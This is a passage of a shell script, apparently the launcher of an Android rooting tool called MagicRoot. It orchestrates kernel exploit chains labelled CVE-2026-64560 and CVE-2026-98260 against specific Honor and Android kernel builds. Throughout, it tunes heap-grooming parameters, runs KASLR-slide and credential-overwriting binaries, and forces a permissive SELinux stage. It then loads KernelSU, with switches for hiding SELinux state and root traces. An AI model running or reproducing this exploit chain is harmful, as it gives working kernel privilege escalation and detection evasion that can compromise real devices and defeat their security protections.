        DEF_ATTEMPTS_PERMISSIVE=160; DEF_ATTEMPTS_FSUID=160
        DEF_ATTEMPTS_CRED1=260; DEF_ATTEMPTS_CRED2=320
        DEF_FRAG_PERMISSIVE=12000; DEF_DRAIN_PERMISSIVE=12000; DEF_MIN_PERMISSIVE=4500
        # Cred parameter decision (see docs/reference/cred-parameters.md):
        # 24 victims / 400 timers / 260+320 attempts / 12000 nfrag /
        # 10000 drain max / 4500 min drain.  6000 nfrag is the legacy reference's
        # 6.18 value; Enhanced documents that it roughly halves landing.
        DEF_FRAG_CRED=12000; DEF_DRAIN_CRED1=10000; DEF_MIN_CRED1=4500
        DEF_DRAIN_CRED2=10000; DEF_MIN_CRED2=4500
        ;;
esac

VICTIMS_PERMISSIVE=${MAGICROOT_VICTIMS_PERMISSIVE:-$DEF_VICTIMS_PERMISSIVE}
VICTIMS_FSUID=${MAGICROOT_VICTIMS_FSUID:-$DEF_VICTIMS_FSUID}
VICTIMS_CRED=${MAGICROOT_VICTIMS_CRED:-$DEF_VICTIMS_CRED}
case "$VICTIMS_PERMISSIVE" in 16|24|32) ;; *) VICTIMS_PERMISSIVE=$DEF_VICTIMS_PERMISSIVE ;; esac
case "$VICTIMS_FSUID" in 16|24|32) ;; *) VICTIMS_FSUID=$DEF_VICTIMS_FSUID ;; esac
case "$VICTIMS_CRED" in 8|12|16|24|32) ;; *) VICTIMS_CRED=$DEF_VICTIMS_CRED ;; esac
# fsuid=0 is mandatory for a usable KernelSU su path: sucompat opens
# /data/adb/ksud with ksu_cred->fsuid, so fsuid=2000 gives EACCES.
# The skip switch is a deliberately mutually-exclusive debug mode; it must
# never be combined with su_compat.
SKIP_FSUID=${MAGICROOT_SKIP_FSUID:-0}
case "$SKIP_FSUID" in 1) ;; *) SKIP_FSUID=0 ;; esac
SU_COMPAT=${MAGICROOT_SU_COMPAT:-1}
ALLOW_SHELL=${MAGICROOT_ALLOW_SHELL:-1}
case "$ALLOW_SHELL" in 1) ;; *) ALLOW_SHELL=0 ;; esac
# KernelSU adb_root feature: upstream static-key default false.  The UI switch
# sets it after root_stage is running.  PMX v1.6 enables it unconditionally;
# MagicRoot keeps the KernelSU source default (off) and exposes a switch.
ADB_ROOT=${MAGICROOT_ADB_ROOT:-0}
case "$ADB_ROOT" in 1) ;; *) ADB_ROOT=0 ;; esac
# PMX v1.6-style su entry: kernel su_compat hooks + Termux wrapper patch.
# No real su file is installed.
SU_ENTRY=${MAGICROOT_SU_ENTRY:-1}
case "$SU_ENTRY" in 1) ;; *) SU_ENTRY=0 ;; esac
# Project defaults: both features are enabled; UI switches can override.
KERNEL_UMOUNT=${MAGICROOT_KERNEL_UMOUNT:-1}
case "$KERNEL_UMOUNT" in 1) ;; *) KERNEL_UMOUNT=0 ;; esac
SELINUX_HIDE=${MAGICROOT_SELINUX_HIDE:-1}
case "$SELINUX_HIDE" in 1) ;; *) SELINUX_HIDE=0 ;; esac
# allow_shell 默认开启（UI「allow shell」默认开，模块以 allow_shell=1 加载）。
# 默认 allow_shell=1；仍可用 UI 或 MAGICROOT_ALLOW_SHELL=0 关闭。
# bootstrap 仅作为旧开关保留。
BOOTSTRAP_SHELL=${MAGICROOT_BOOTSTRAP_ALLOW_SHELL:-0}
[ -f "$D/bootstrap_allow_shell" ] && BOOTSTRAP_SHELL=1
case "$BOOTSTRAP_SHELL" in 1) ;; *) BOOTSTRAP_SHELL=0 ;; esac
LOAD_ALLOW_SHELL=$ALLOW_SHELL
if [ "$ALLOW_SHELL" != "1" ] && [ "$BOOTSTRAP_SHELL" = "1" ]; then
    LOAD_ALLOW_SHELL=1
fi
export MAGICROOT_ALLOW_SHELL_UI="$ALLOW_SHELL"
export MAGICROOT_BOOTSTRAP_SHELL="$BOOTSTRAP_SHELL"
export MAGICROOT_KERNEL_UMOUNT="$KERNEL_UMOUNT"
export MAGICROOT_SELINUX_HIDE="$SELINUX_HIDE"
if [ "$SKIP_FSUID" = "1" ] && [ "$SU_COMPAT" = "1" ]; then
    echo "FAIL=fsuid_su_path_conflict"
    exit 9
fi
[ "$SKIP_FSUID" = "1" ] && echo "WARN=skip_fsuid_debug_mode_no_su"

ATTEMPTS_PERMISSIVE=${MAGICROOT_ATTEMPTS_PERMISSIVE:-$DEF_ATTEMPTS_PERMISSIVE}
ATTEMPTS_FSUID=${MAGICROOT_ATTEMPTS_FSUID:-$DEF_ATTEMPTS_FSUID}
ATTEMPTS_CRED1=${MAGICROOT_ATTEMPTS_CRED1:-$DEF_ATTEMPTS_CRED1}
ATTEMPTS_CRED2=${MAGICROOT_ATTEMPTS_CRED2:-$DEF_ATTEMPTS_CRED2}
FRAG_PERMISSIVE=${MAGICROOT_FRAG_PERMISSIVE:-$DEF_FRAG_PERMISSIVE}
DRAIN_PERMISSIVE=${MAGICROOT_DRAIN_PERMISSIVE:-$DEF_DRAIN_PERMISSIVE}
MIN_PERMISSIVE=${MAGICROOT_MIN_PERMISSIVE:-$DEF_MIN_PERMISSIVE}
FRAG_CRED=${MAGICROOT_FRAG_CRED:-$DEF_FRAG_CRED}
DRAIN_CRED1=${MAGICROOT_DRAIN_CRED1:-$DEF_DRAIN_CRED1}
MIN_CRED1=${MAGICROOT_MIN_CRED1:-$DEF_MIN_CRED1}
DRAIN_CRED2=${MAGICROOT_DRAIN_CRED2:-$DEF_DRAIN_CRED2}
MIN_CRED2=${MAGICROOT_MIN_CRED2:-$DEF_MIN_CRED2}
# timers per victim (legacy 400); capture loop count for grab.sh.
GRAB_LOOPS=${MAGICROOT_GRAB_LOOPS:-120}
for _v in ATTEMPTS_PERMISSIVE ATTEMPTS_FSUID ATTEMPTS_CRED1 ATTEMPTS_CRED2; do
    eval "_n=\$$_v"
    case "$_n" in ''|*[!0-9]*) eval "$_v=120" ;; esac
    [ "$_n" -ge 1 ] 2>/dev/null && [ "$_n" -le 20000 ] 2>/dev/null || eval "$_v=120"
done
for _v in FRAG_PERMISSIVE FRAG_CRED; do
    eval "_n=\$$_v"
    case "$_n" in ''|*[!0-9]*) eval "$_v=6000" ;; esac
    [ "$_n" -ge 100 ] 2>/dev/null && [ "$_n" -le 60000 ] 2>/dev/null || eval "$_v=6000"
done
for _v in DRAIN_PERMISSIVE DRAIN_CRED1 DRAIN_CRED2; do
    eval "_n=\$$_v"
    case "$_n" in ''|*[!0-9]*) eval "$_v=12000" ;; esac
    [ "$_n" -ge 1000 ] 2>/dev/null && [ "$_n" -le 60000 ] 2>/dev/null || eval "$_v=12000"
done
for _v in MIN_PERMISSIVE MIN_CRED1 MIN_CRED2; do
    eval "_n=\$$_v"
    case "$_n" in ''|*[!0-9]*) eval "$_v=3500" ;; esac
    [ "$_n" -ge 100 ] 2>/dev/null && [ "$_n" -le 60000 ] 2>/dev/null || eval "$_v=3500"
done
case "$GRAB_LOOPS" in ''|*[!0-9]*) GRAB_LOOPS=120 ;; esac
[ "$GRAB_LOOPS" -ge 1 ] 2>/dev/null && [ "$GRAB_LOOPS" -le 400 ] 2>/dev/null || GRAB_LOOPS=40
# 持久 ko 缓存只保留最近 KO_CACHE_MAX 个、KO_CACHE_DAYS 天内的文件（同 boot 加速，跨 boot 自动淘汰）。
KO_CACHE_MAX=${MAGICROOT_KO_CACHE_MAX:-6}
KO_CACHE_DAYS=${MAGICROOT_KO_CACHE_DAYS:-7}
case "$KO_CACHE_MAX" in ''|*[!0-9]*) KO_CACHE_MAX=6 ;; esac
case "$KO_CACHE_DAYS" in ''|*[!0-9]*) KO_CACHE_DAYS=7 ;; esac
[ "$KO_CACHE_MAX" -ge 1 ] 2>/dev/null || KO_CACHE_MAX=6
[ "$KO_CACHE_MAX" -le 32 ] 2>/dev/null || KO_CACHE_MAX=32
[ "$KO_CACHE_DAYS" -ge 1 ] 2>/dev/null || KO_CACHE_DAYS=7
[ "$KO_CACHE_DAYS" -le 365 ] 2>/dev/null || KO_CACHE_DAYS=365

echo "TUNING=$TUNING VICTIMS_PERMISSIVE=$VICTIMS_PERMISSIVE"
echo "VICTIMS_FSUID=$VICTIMS_FSUID"
echo "VICTIMS_CRED=$VICTIMS_CRED"
echo "SKIP_FSUID=$SKIP_FSUID"
echo "DRAIN_PERMISSIVE=$DRAIN_PERMISSIVE MIN_PERMISSIVE=$MIN_PERMISSIVE"
echo "GRAB_LOOPS=$GRAB_LOOPS"
echo "CRED_WAIT=helper futex-cred MODULE_WAIT=helper futex-live"
echo "CRED nfrag=$FRAG_CRED drain1=$DRAIN_CRED1 min1=$MIN_CRED1 drain2=$DRAIN_CRED2 min2=$MIN_CRED2"
echo "ATTEMPTS_PERMISSIVE=$ATTEMPTS_PERMISSIVE ATTEMPTS_CRED=$ATTEMPTS_CRED1/$ATTEMPTS_CRED2"
mkdir -p "$D" "$MARK" 2>/dev/null || true
echo "MARK_DIR=$MARK"
cd "$D" || exit 1
# The APK staging path sets 755 on every asset, but a manual `adb push`
# deployment (device testing / recovery) does not preserve the execute bit.
# Keep this list complete: a non-executable wait_helper silently breaks the
# futex handoff and makes the cred stage fail before module load.
chmod 755 "$D"/kaslr_slide_61258 "$D"/kaslr_slide_61258b "$D"/kaslr_slide_6138 "$D"/kaslr_slide_aph136g142 "$D"/ko_patch \
    "$D"/addrcalc "$D"/t64560_v36 "$D"/cred_target \
    "$D"/t64560_cred "$D"/ksu_grant "$D"/wait_helper \
    "$D"/forker 2>/dev/null
# Removed scheme: the P0-safe binaries caused device reboots.  Delete stale
# copies from previous deployments so they can never be selected again.
rm -f "$D"/t64560_v36_safe "$D"/t64560_cred_safe 2>/dev/null || true
chmod 755 "$D"/grab.sh "$D"/grab_legacy.sh "$D"/run.sh "$D"/root_stage.sh \
    "$D"/64560-61821/* \
    "$D"/clean.sh "$D"/su_entry.sh \
    "$D"/kernel_profiles.sh 2>/dev/null

# ---------------------------------------------------------------------------
# Preflight: record boot/load/memory snapshot without blocking or aborting.
# ---------------------------------------------------------------------------
preflight() {
    _up=$(cut -d. -f1 /proc/uptime 2>/dev/null || echo 0)
    _load=$(cut -d' ' -f1 /proc/loadavg 2>/dev/null | cut -d. -f1)
    [ -n "$_load" ] || _load=0
    _mem=$(awk '/^MemAvailable:/ {print int($2)}' /proc/meminfo 2>/dev/null)
    [ -n "$_mem" ] || _mem=0
    _bootc=$(getprop sys.boot_completed 2>/dev/null | tr -d '\r\n')
    echo "PREFLIGHT_OK uptime=${_up}s load=${_load} mem_avail_kb=${_mem} boot_completed=${_bootc:-0} mode=unrestricted"
    return 0
}
preflight || exit 2
if [ "${MAGICROOT_PREFLIGHT_ONLY:-0}" = "1" ]; then
    echo "PREFLIGHT_ONLY_OK"
    exit 0
fi

# ---------------------------------------------------------------------------
# Optional second chain: CVE-2026-98260 (Honor 6.12.58 / 6.12.38 adapted builds).
# Opt-in only.  The default CVE-2026-64560 pipeline below is unchanged.
#   MAGICROOT_CHAIN=64560 (default) | 98260
#   MAGICROOT_ENABLE_98260=1 is required for 98260 (set by the app only after
#   the user explicitly selects the experimental chain and confirms).
# The 98260 chain has its own stage machine and never touches the 64560
# KASLR/ko_patch/permissive/cred/KernelSU assets or /data/adb.
# ---------------------------------------------------------------------------
cleanup_stale_98260_rootd

CHAIN=${MAGICROOT_CHAIN:-64560}
case "$CHAIN" in
    64560|"")
        echo "CHAIN=64560"
        # HOneClick's 64560 backend is specific to the g928 6.18.21 kernel.
        if [ "$(uname -r 2>/dev/null)" = "6.18.21-android17-5-g928d1bb4f1d7-abogki542339678-4k" ]; then
            chmod 755 "$D"/64560-61821/* 2>/dev/null || true
            sh "$D/64560-61821/run64560_61821.sh"
            _hoc_rc=$?
            echo "CHAIN_64560_61821_RC=$_hoc_rc"
            if [ "$_hoc_rc" = "0" ]; then
                echo "DONE"
                exit 0
            fi
            echo "FAIL=chain_64560_61821 rc=$_hoc_rc"
            exit "$_hoc_rc"
        fi
        ;;
    98260)
        echo "CHAIN=98260"
        echo "CHAIN_64560_PIPELINE=skipped"
        mark CHAIN_98260_PRE
        if [ "${MAGICROOT_ENABLE_98260:-0}" != "1" ]; then
            echo "FAIL=chain_98260_not_enabled"
            echo "HINT=98260 is an experimental opt-in chain; select it in the app and confirm"
            exit 61
        fi
        if [ ! -f "$D/98260/run98260.sh" ] &&
           [ ! -f "$D/98260/run6157_full.sh" ] &&
           [ ! -f "$D/61157/run61157.sh" ]; then
            echo "FAIL=chain_98260_assets_missing dir=$D/98260"
            echo "HINT=redeploy assets from the app (extract components) before running 98260; do not run run.sh from a cleaned workdir"
            exit 62
        fi
        # Self-heal CRLF/staging damage from an older deployment.  A CRLF
        # run98260.sh fails at its blank line and at "set -u".
        normalize_sh() {
            [ -f "$1" ] || return 0
            _lf="$1.lf.$$"
            if tr -d '\r' < "$1" > "$_lf" 2>/dev/null; then
                chmod 755 "$_lf" 2>/dev/null || true
                mv -f "$_lf" "$1" 2>/dev/null || rm -f "$_lf" 2>/dev/null || true
            else
                rm -f "$_lf" 2>/dev/null || true
            fi
        }
        normalize_sh "$D/98260/run98260.sh"
        normalize_sh "$D/61157/run61157.sh"
        normalize_sh "$D/kernel_profiles.sh"
        # 6.1.157: use the MyUse path that was verified on ELP-AN00
        # (brm_plant + pc98260_su + 1 MB ksu-loader).  The 1.0.6
        # 98260-6157 payload failed real_cred on this device and is not used.
        ACTUAL_KERNEL=$(uname -r 2>/dev/null || echo unknown)
        case "$ACTUAL_KERNEL" in
            6.1.157-android14-11-g7d3922fade43*|6.1.157-android14-11-g2646292297b1*|6.1.157-android14-11-gaaa383620ebf*|6.1.157-android14-11-g3306a328b7be*|6.1.157-android14-11-g84ffa64b710b*|6.1.157-android14-11-g77f76e323a02*|6.1.157-android14-11-g8d63307071ad*|6.1.99-android14-11-gce84935796c9*|6.1.99-android14-11-g5859fbdbad8c*|6.1.99-android14-11-g54d40b4fb287*|6.1.128-android14-11-g40b1fd119d9b*|6.1.128-android14-11-g8a4968670f1c*|6.1.128-android14-11-g2e1f0741dafb*|6.1.99-android14-11-ge9da27488f45*)
                # Upstream 1.0.36 6.1 route: 98260-6157/98260-g264 + ksu6157.
                # No model/BTF/build-hash gates; the exact kernel selects the
                # profile and all matching payloads are allowed.
                echo "CHAIN=98260 PROFILE_6157=upstream"
                normalize_sh "$D/98260/run6157_full.sh"
                chmod 755 "$D/98260/run6157_full.sh" \
                    "$D"/98260-6157/* "$D"/98260-g264/* "$D"/98260-gaaa/* "$D"/98260-g3306/* \
                    "$D"/98260-g84/* "$D"/98260-g77f/* "$D"/98260-gce849/* \
                    "$D"/98260-g5859/* "$D"/98260-g54d/* "$D"/98260-g40b1/* \
                    "$D"/98260-g8a496/* "$D"/98260-g2e1f/* \
                    "$D"/98260-ge9da/* "$D"/98260-g8d6/* "$D"/g264/* "$D"/su-g264/* \
                    "$D"/ksu6157/* "$D"/ksu6157-g264/* "$D"/ksu6157-m6/* \
                    2>/dev/null || true
                sh "$D/98260/run6157_full.sh"
                RC6157=$?
                echo "CHAIN_6157_RC=$RC6157"
                if [ "$RC6157" = "0" ]; then
                    if [ "${MAGICROOT_98260_PREFLIGHT:-0}" = "1" ]; then
                        echo "CHAIN_98260_PREFLIGHT_OK=1"
                        exit 0
                    fi
                    if [ "${MAGICROOT_98260_KSU:-1}" != "1" ]; then
                        echo "CHAIN_98260_DONE_ROOTD_ONLY=1"
                        echo "DONE"
                        exit 0
                    fi
                    echo "CHAIN_98260_DONE"
                    finalize_98260
                    echo "DONE"
                    exit 0
                fi
                case "$RC6157" in ''|*[!0-9]*) exit 64 ;; *) exit "$RC6157" ;; esac
                ;;
            6.1.157-android14-11-g19a495a97bff*)
                echo "CHAIN=98260 PROFILE_61157=myuse"
                chmod 755 "$D"/61157/* "$D"/ksu6157/* 2>/dev/null || true
                normalize_sh "$D/61157/run61157.sh"
                MAGICROOT_61157_KSU=${MAGICROOT_98260_KSU:-1} \
                MAGICROOT_61157_MIN_UP=${MAGICROOT_61157_MIN_UP:-180} \
                    sh "$D/61157/run61157.sh"
                RC61157=$?
                echo "CHAIN_61157_RC=$RC61157"
                if [ "$RC61157" = "0" ]; then
                    # This route has no SuSFS load step, but it shares the
                    # bounded rootd cleanup. Mark the phase so the UI never
                    # sits at 98% without a visible reason.
                    echo "98260_FINALIZE_BEGIN susfs=0 load=0 rootd_keep=${MAGICROOT_KEEP_ROOTD:-0}"
                    cleanup_98260_rootd_listener
                    echo "98260_FINALIZE_END"
                    echo "DONE"
                    exit 0
                fi
                case "$RC61157" in ''|*[!0-9]*) exit 63 ;; *) exit "$RC61157" ;; esac
                ;;
        esac
        . "$D/kernel_profiles.sh"
        _adaptive_kernel=$(uname -r 2>/dev/null || echo unknown)
        if [ "${MAGICROOT_98260_ADAPTIVE:-0}" = "1" ] &&
           [ "${_adaptive_kernel#6.18.21}" != "$_adaptive_kernel" ]; then
            # Locally generated boot.img profile: the exact kernel is already
            # validated by KernelProfileGenerator on the device.  Do not gate
            # it on a fixed release list.
            PROFILE_ID=honor-61821-98260
            PROFILE_CHAIN=98260
            echo "KERNEL_PROFILE=$PROFILE_ID PROFILE_CHAIN=$PROFILE_CHAIN adaptive=1"
        elif ! select_chain_98260_profile "$_adaptive_kernel" "$(getprop ro.product.model 2>/dev/null || echo unknown)"; then
            echo "FAIL=kernel_unsupported actual=$(uname -r 2>/dev/null || echo unknown) chain=98260 expected=$CHAIN_98260_KERNELS"
    echo "HINT_DEPLOY=installed assets may be stale; reinstall current APK and run asset deployment again"
    echo "DEPLOYED_PROFILE_6123=$(grep -c '6.12.23' "$D/kernel_profiles.sh" 2>/dev/null || echo 0)"
    echo "DEPLOYED_RUN60_6123=$(grep -c '98260-6123' "$D/98260/run98260.sh" 2>/dev/null || echo 0)"
    echo "DEPLOYED_PROFILE_6138Y=$(grep -c 'g7ae8ec909e03' "$D/kernel_profiles.sh" 2>/dev/null || echo 0)"
    echo "DEPLOYED_RUN60_6138Y=$(grep -c '98260-6138y' "$D/98260/run98260.sh" 2>/dev/null || echo 0)"
            exit 2
        fi
        echo "KERNEL_PROFILE=$PROFILE_ID PROFILE_CHAIN=$PROFILE_CHAIN"
        chmod 755 "$D"/98260/* "$D"/98260-61258b/* "$D"/98260-61258c/* "$D"/98260-6138/* "$D"/98260-6123/* "$D"/98260-g856/* "$D"/98260-6138y/* "$D"/98260-g554/* "$D"/98260-f171/* "$D"/98260-6658/* "$D"/98260-6689/* "$D"/98260-61821/* "$D"/98260-61821-brm/* "$D"/98260-aph112/* "$D"/98260-h1c/* "$D"/98260-g142/* "$D"/98260-ga812/* "$D"/98260-g893/* 2>/dev/null || true
        # The shared run98260.sh independently resolves PROFILE_LOCAL from
        # uname -r; export the already-selected profile so a stale staged
        # script cannot silently mix one kernel's syms/KO with another.
        export MAGICROOT_98260_PROFILE="$PROFILE_ID"
        sh "$D/98260/run98260.sh"
        CHAIN_RC=$?
        echo "CHAIN_98260_RC=$CHAIN_RC"
        if [ "$CHAIN_RC" = "0" ]; then
            if [ "${MAGICROOT_98260_PREFLIGHT:-0}" = "1" ]; then
                echo "CHAIN_98260_PREFLIGHT_OK=1"
                exit 0
            fi
            if [ "${MAGICROOT_98260_KSU:-1}" != "1" ]; then
                echo "CHAIN_98260_DONE_ROOTD_ONLY=1"
                echo "DONE"
                exit 0
            fi
            echo "CHAIN_98260_DONE"
            finalize_98260
            echo "DONE"
            exit 0
        fi
        echo "FAIL=chain_98260 rc=$CHAIN_RC"
        # Preserve the chain-specific rc (76 parked / 77 boot changed / 80 proof / 81 preflight).
        case "$CHAIN_RC" in ''|*[!0-9]*) exit 63 ;; *) exit "$CHAIN_RC" ;; esac
        ;;
    *)
        echo "FAIL=chain_unknown chain=$CHAIN"
        exit 60
        ;;
esac

. "$D/kernel_profiles.sh"
ACTUAL_KERNEL=$(uname -r 2>/dev/null || echo unknown)
if ! select_kernel_profile "$ACTUAL_KERNEL" "$(getprop ro.product.model 2>/dev/null || echo unknown)"; then
    echo "FAIL=kernel_unsupported actual=$ACTUAL_KERNEL"
    echo "HINT_DEPLOY=installed assets may be stale; reinstall current APK and run asset deployment again"
    echo "DEPLOYED_PROFILE_6123=$(grep -c '6.12.23' "$D/kernel_profiles.sh" 2>/dev/null || echo 0)"
    echo "DEPLOYED_RUN60_6123=$(grep -c '98260-6123' "$D/98260/run98260.sh" 2>/dev/null || echo 0)"
    echo "DEPLOYED_PROFILE_6138Y=$(grep -c 'g7ae8ec909e03' "$D/kernel_profiles.sh" 2>/dev/null || echo 0)"
    echo "DEPLOYED_RUN60_6138Y=$(grep -c '98260-6138y' "$D/98260/run98260.sh" 2>/dev/null || echo 0)"
    exit 2
fi

KERNEL_PROFILE="$PROFILE_ID"
if [ "${MAGICROOT_FLAVOR_SYMS_MISSING:-0}" = "1" ] || [ "${FLAVOR_SYMS_MISSING:-0}" = "1" ]; then
    echo "FAIL=flavor_syms_unavailable profile=$KERNEL_PROFILE flavor=$KSU_FLAVOR"
    echo "HINT=no matching LKM/syms for this kernel KMI and backend (fail-closed; using another KMI's addresses would crash the module)"
    echo "HINT_SUPPORT=6.12.58/6.12.38/6.12.23/6.12.38-YLP/6.6.118/6.18.21-g928/6.18.21-BRM: profiles are compiled per exact build; verify deployed profile counters"
    exit 2
fi
echo "KERNEL_ACTUAL=$ACTUAL_KERNEL"
echo "KERNEL_PROFILE=$KERNEL_PROFILE"
echo "PROFILE_READY=$PROFILE_READY"
echo "KASLR_BIN=$KASLR_BIN"
echo "SYMS=$SYMS"
echo "KO_TEMPLATE=$KO_TEMPLATE"
echo "V36_BIN=$V36_BIN"
echo "CRED_BIN=$CRED_BIN"
# Actual runtime uses the v42 two-phase cred writer (t64560_cred), not the
# P0-safe experiment.  The safe binaries caused device reboots and are no
# longer shipped or selected.
echo "CRED_SCHEME=v42"
echo "AB_EXPORT=$AB_EXPORT"
echo "ALLOW_SHELL=$ALLOW_SHELL ADB_ROOT=$ADB_ROOT SU_ENTRY=$SU_ENTRY"
echo "KERNEL_UMOUNT=$KERNEL_UMOUNT"
echo "SELINUX_HIDE=$SELINUX_HIDE"
echo "KASLR_ONLY=$KASLR_ONLY"
echo "KSU_FLAVOR=$KSU_FLAVOR"
echo "KSU_MANAGER=$KSU_MANAGER_PKG"
echo "KSU_EXPECT=version=$EXPECT_KVER uapi=$EXPECT_UAPI template=$KO_TEMPLATE syms=$SYMS compat=$KO_COMPAT"
echo "ALLOW_SHELL=$ALLOW_SHELL LOAD_ALLOW_SHELL=$LOAD_ALLOW_SHELL BOOTSTRAP_SHELL=$BOOTSTRAP_SHELL"
if [ "$LOAD_ALLOW_SHELL" != "1" ]; then
    echo "ALLOW_SHELL_NOTE=off (cold-boot root_stage needs an allowlisted shell; enable 「allow shell」 and reboot if grant fails)"
fi

# ---------------------------------------------------------------------------
# Installed-manager extraction ("standard state"):
#   * locate the selected manager APK through pm path;
#   * extract its userspace ksud from lib/arm64-v8a/libksud.so (newer managers
#     rename that library, so the remaining arm64 .so candidates are probed
#     until one answers `-V`);
#   * there is no bundled ksud fallback any more: the matching manager must be
#     installed by the user, otherwise the run fails with a clear hint.
# The app writes the manager signing tuple to $D/manager_sig through
# PackageManager; root_stage falls back to `ksud debug get-sign`.
# ---------------------------------------------------------------------------
KSU_FLAVOR=$(ksu_flavor_normalize "$KSU_FLAVOR")
KSU_MANAGER_PKG=${MAGICROOT_KSU_PKG:-$(ksu_flavor_pkg "$KSU_FLAVOR")}
# Carry the resolved package (possibly BakaSU Dev) into root_stage; the
# canonical flavor package alone would register the wrong signature when both
# stable and dev builds are installed.
export MAGICROOT_KSU_PKG="$KSU_MANAGER_PKG"
KSU_MANAGER_LABEL=$(ksu_flavor_label "$KSU_FLAVOR")
EXPECT_KVER=$(ksu_flavor_kver "$KSU_FLAVOR")
EXPECT_UAPI=$(ksu_flavor_uapi "$KSU_FLAVOR")
KSUD=""
if [ -n "${MAGICROOT_KSUD:-}" ] && [ -x "$MAGICROOT_KSUD" ]; then
    KSUD="$MAGICROOT_KSUD"
    echo "KSUD_SOURCE=libexec path=$KSUD"
fi
KSUD_EXTRACTED="$D/ksud_${KSU_FLAVOR}.manager"
KSU_MANAGER_APK=""
if command -v pm >/dev/null 2>&1; then
    _mp=$(pm path "$KSU_MANAGER_PKG" 2>/dev/null | head -1 | sed 's/^package://')
    [ -n "$_mp" ] && [ -f "$_mp" ] && KSU_MANAGER_APK="$_mp"
fi
echo "KSU_MANAGER_APK=${KSU_MANAGER_APK:-none}"
if [ -z "$KSUD" ] && [ -n "$KSU_MANAGER_APK" ] && [ -x /system/bin/unzip ]; then
    rm -f "$KSUD_EXTRACTED" 2>/dev/null || true
    _found=0
    _unzip_one() {
        _cand="$1"
        unzip -p "$KSU_MANAGER_APK" "$_cand" > "$KSUD_EXTRACTED" 2>/dev/null || return 1
        [ -s "$KSUD_EXTRACTED" ] || return 1
        chmod 755 "$KSUD_EXTRACTED" 2>/dev/null || true
        _ver=$("$KSUD_EXTRACTED" -V 2>/dev/null | head -1)
        case "$_ver" in
            ksud*) echo "KSUD_ASSET_CANDIDATE=$_cand version=$_ver"; return 0 ;;
        esac
        return 1
    }
    for _cand in lib/arm64-v8a/libksud.so assets/ksud lib/arm64-v8a/libksud; do
        if _unzip_one "$_cand"; then _found=1; break; fi
    done
    if [ "$_found" != "1" ]; then
        for _cand in $(unzip -l "$KSU_MANAGER_APK" 2>/dev/null \
                | awk '$4 ~ /^lib\/arm64-v8a\/.*\.so$/ {print $1" "$4}' \
                | sort -rn | head -4 | awk '{print $2}'); do
            case "$_cand" in
                *libadbroot.so|*libkernelsu.so|*libandroidx*|*libdatastore*) continue ;;
            esac
            if _unzip_one "$_cand"; then _found=1; break; fi
        done
    fi
    if [ "$_found" = "1" ]; then
        KSUD="$KSUD_EXTRACTED"
        echo "KSUD_SOURCE=manager-apk path=$KSUD"
    fi
else
    echo "KSUD_SOURCE=none reason=manager_not_installed_or_unzip_missing"
fi
if [ -z "$KSUD" ] && [ -x "$D/ksud_$KSU_FLAVOR" ]; then
    KSUD="$D/ksud_$KSU_FLAVOR"
    echo "KSUD_SOURCE=bundled-fallback path=$KSUD"
fi
# Manager KMI .ko extraction.
#
# Sync with the app-side fix: the app already carves the manager APK's embedded
# raw-deflate KMI modules, validates vermagic and writes
# /data/local/tmp/magic/ko-<flavor>.ko.  The 64560 chain must prefer that
# already-validated file.  The old shell scanner below only looks for plain
# .ko zip entries, so SukiSU (embedded raw-deflate only) would otherwise fall
# back to the bundled template / pick an incompatible KMI.
_kmi=$(uname -r 2>/dev/null | sed -n 's/^\([0-9][0-9]*\.[0-9][0-9]*\).*/\1/p')
[ -n "$_kmi" ] || _kmi="6.12"
if [ -n "${MAGICROOT_MANAGER_KO:-}" ] && [ -f "$MAGICROOT_MANAGER_KO" ]; then
    KO_TEMPLATE="$MAGICROOT_MANAGER_KO"
    echo "MANAGER_LKM_OVERRIDE=app-adaptive path=$KO_TEMPLATE"
fi
APP_LKM="$D/ko-$KSU_FLAVOR.ko"
APP_LKM_USED=0
KSU_MANAGER_LKM=""

ko_kmi_of() {
    _vm=$(grep -a -o 'vermagic=[^ ]*' "$1" 2>/dev/null | head -1)
    printf '%s' "$_vm" | sed -n 's/^vermagic=\([0-9][0-9]*\.[0-9][0-9]*\).*/\1/p'
}
ko_is_elf() {
    _magic=$(head -c 4 "$1" 2>/dev/null | od -An -tx1 | tr -d ' \n')
    [ "$_magic" = "7f454c46" ]
}

if [ -f "$APP_LKM" ]; then
    _lkmi=$(ko_kmi_of "$APP_LKM")
    _vm=$(grep -a -o 'vermagic=[^ ]*' "$APP_LKM" 2>/dev/null | head -1)
    if ko_is_elf "$APP_LKM" && [ -n "$_lkmi" ] && [ "$_lkmi" = "$_kmi" ]; then
        KSU_MANAGER_LKM="$APP_LKM"
        KO_TEMPLATE="$APP_LKM"
        KO_COMPAT="app-staged"
        APP_LKM_USED=1
        echo "MANAGER_LKM=$APP_LKM source=app-staged bytes=$(wc -c < "$APP_LKM" 2>/dev/null) kernel=$_kmi vermagic=${_vm#vermagic=}"
        echo "KO_TEMPLATE_SOURCE=app-staged template=$(basename "$KO_TEMPLATE")"
    else
        echo "MANAGER_LKM=app-staged_invalid target=$_kmi actual=${_lkmi:-none} vermagic=${_vm:-none}"
        rm -f "$APP_LKM" 2>/dev/null || true
    fi
fi

if [ "$APP_LKM_USED" = "0" ] && [ -n "$KSU_MANAGER_APK" ] && [ -x /system/bin/unzip ]; then
    _ko_pick=""
    _ko_best=0
    for _cand in $(unzip -l "$KSU_MANAGER_APK" 2>/dev/null \
            | awk '$4 ~ /\.ko$/ {print $1" "$4}' | sort -rn | head -8 | awk '{print $2}'); do
        case "$_cand" in
            */*susfs*|*susfs*) continue ;;
        esac
        _base=$(basename "$_cand")
        _score=0
        case "$_base" in
            *kernelsu*|*ksu*) _score=$((_score + 8)) ;;
        esac
        case "$_base" in
            *"$_kmi"*) _score=$((_score + 6)) ;;
        esac
        case "$_base" in
            *android*) _score=$((_score + 2)) ;;
        esac
        if [ "$_score" -gt "$_ko_best" ]; then
            _ko_best=$_score
            _ko_pick="$_cand"
        fi
    done
    if [ -n "$_ko_pick" ]; then
        _ko_out="$D/ko-$KSU_FLAVOR.ko"
        if unzip -p "$KSU_MANAGER_APK" "$_ko_pick" > "$_ko_out" 2>/dev/null && [ -s "$_ko_out" ]; then
            _lkmi=$(ko_kmi_of "$_ko_out")
            _vm=$(grep -a -o 'vermagic=[^ ]*' "$_ko_out" 2>/dev/null | head -1)
            if ko_is_elf "$_ko_out" && [ -n "$_lkmi" ] && [ "$_lkmi" = "$_kmi" ]; then
                chmod 644 "$_ko_out" 2>/dev/null || true
                KSU_MANAGER_LKM="$_ko_out"
